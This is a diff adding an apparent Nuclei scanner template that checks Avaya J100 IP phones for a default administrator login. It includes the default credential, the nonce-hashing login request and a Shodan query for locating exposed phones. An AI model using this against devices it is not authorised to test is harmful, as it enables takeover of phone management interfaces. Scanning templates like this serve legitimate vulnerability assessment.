@@ -1,0 +1,61 @@
+id: avaya-phone-web-interface-default-credential-login
+
+info:
+  name: Avaya Phone Web Interface 默认凭据登录漏洞
+  author: tpierru
+  severity: high
+  description: |
+    Avaya Phone Web Interface 存在默认登录凭据漏洞，攻击者可利用默认账号口令登录设备管理界面，进而获取敏感信息、篡改配置或执行未授权操作。
+  reference:
+    - https://documentation.avaya.com/bundle/InstallandadminJ100seriesIPPhone_r4.1.x/page/Logging_into_web_UI.html
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    max-requests: 1
+    shodan-query: html:"Avaya J179 Phone"
+  tags: Avaya-Phone
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+variables:
+  username: "admin"
+  password: "27238"
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/J100WebServer.cgi?Operation=0"
+    extractors:
+      - type: kval
+        name: nonce
+        kval:
+          - j100nonce
+        internal: true
+  - raw:
+      - |
+        POST /cgi-bin/J100WebServer.cgi?Operation=1 HTTP/1.1
+        Host: {{Host}}
+        Content-Type: application/x-www-form-urlencoded
+
+        uname={{username}}&psw={{sha256(concat(password,nonce))}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/cgi-bin/J100WebServer.cgi?Operation=211"
+          - "id=\"redirectToDefault"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "Invalid username or password"
+        negative: true
+      - type: status
+        status:
+          - 200
+
+# digest: 490a00463044022052160b9f254223ce23f031b54483895e9a189cfb7e31d4b0c16a4edb2cea65df022029b40f4ce1e8b27fec261405dfe5545846016b9bb0dc6a4be36e02c1ef3e6535:922c64590222798bb761d5b6d8e72950
